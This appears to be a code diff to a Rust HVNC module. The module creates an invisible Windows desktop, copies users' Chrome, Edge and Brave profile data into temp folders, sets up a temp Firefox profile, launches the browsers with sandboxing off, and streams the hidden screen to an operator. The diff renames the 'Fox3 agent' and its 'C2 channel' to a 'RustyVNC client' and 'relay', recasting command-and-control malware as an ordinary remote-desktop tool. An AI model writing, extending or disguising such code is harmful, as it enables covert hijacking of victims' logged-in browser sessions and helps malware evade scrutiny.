@@ -1,9 +1,9 @@
 #![allow(dead_code, unused_assignments, unused_unsafe, unused_variables)]
 
-/// HVNC (Hidden Virtual Network Computing) module for the Fox3 agent.
+/// HVNC (Hidden Virtual Network Computing) module for the RustyVNC client.
 ///
 /// Creates an invisible Windows desktop, captures its screen via BitBlt,
-/// compresses to JPEG via GDI+, and streams frames through the C2 channel.
+/// compresses to JPEG via GDI+, and streams frames through the RustyVNC relay.
 /// Operator mouse/keyboard input is relayed back via PostMessageW.
 ///
 /// Windows-only. Non-Windows compiles to a stub that returns an error.
@@ -1120,7 +1120,8 @@ mod win {
                 ACTION_CHROME => {
                     let local = get_env_var("LOCALAPPDATA");
                     let user_data = format!("{}\\Google\\Chrome\\User Data", local);
-                    let temp_data = format!("{}\\Temp\\fox3_chrome_{}", local, std::process::id());
+                    let temp_data =
+                        format!("{}\\Temp\\rustyvnc_chrome_{}", local, std::process::id());
                     copy_dir_if_exists(&user_data, &temp_data, desktop_name);
                     let cmd = format!(
                         "\"{}\\Google\\Chrome\\Application\\chrome.exe\" --no-sandbox --allow-no-sandbox-job --disable-gpu --disable-3d-apis --user-data-dir=\"{}\"",
@@ -1131,7 +1132,8 @@ mod win {
                 ACTION_EDGE => {
                     let local = get_env_var("LOCALAPPDATA");
                     let user_data = format!("{}\\Microsoft\\Edge\\User Data", local);
-                    let temp_data = format!("{}\\Temp\\fox3_edge_{}", local, std::process::id());
+                    let temp_data =
+                        format!("{}\\Temp\\rustyvnc_edge_{}", local, std::process::id());
                     copy_dir_if_exists(&user_data, &temp_data, desktop_name);
                     let cmd = format!(
                         "\"{}\\Microsoft\\Edge\\Application\\msedge.exe\" --no-sandbox --disable-gpu --disable-3d-apis --user-data-dir=\"{}\"",
@@ -1142,7 +1144,8 @@ mod win {
                 ACTION_BRAVE => {
                     let local = get_env_var("LOCALAPPDATA");
                     let user_data = format!("{}\\BraveSoftware\\Brave-Browser\\User Data", local);
-                    let temp_data = format!("{}\\Temp\\fox3_brave_{}", local, std::process::id());
+                    let temp_data =
+                        format!("{}\\Temp\\rustyvnc_brave_{}", local, std::process::id());
                     copy_dir_if_exists(&user_data, &temp_data, desktop_name);
                     let cmd = format!(
                         "\"{}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe\" --no-sandbox --disable-gpu --disable-3d-apis --user-data-dir=\"{}\"",
@@ -1153,7 +1156,7 @@ mod win {
                 ACTION_FIREFOX => {
                     let local = get_env_var("LOCALAPPDATA");
                     let temp_profile =
-                        format!("{}\\Temp\\fox3_firefox_{}", local, std::process::id());
+                        format!("{}\\Temp\\rustyvnc_firefox_{}", local, std::process::id());
                     let cmd = format!(
                         "\"{}\\Mozilla Firefox\\firefox.exe\" -no-remote -profile \"{}\"",
                         get_env_var("ProgramFiles"),
@@ -1945,7 +1948,7 @@ mod win {
             }
 
             let conn_id = Uuid::new_v4();
-            let desktop_name = format!("fox3_{}", &conn_id.to_string()[..8]);
+            let desktop_name = format!("rustyvnc_{}", &conn_id.to_string()[..8]);
             let desktop_name_wide = to_wide(&desktop_name);
 
             let h_desk = unsafe {
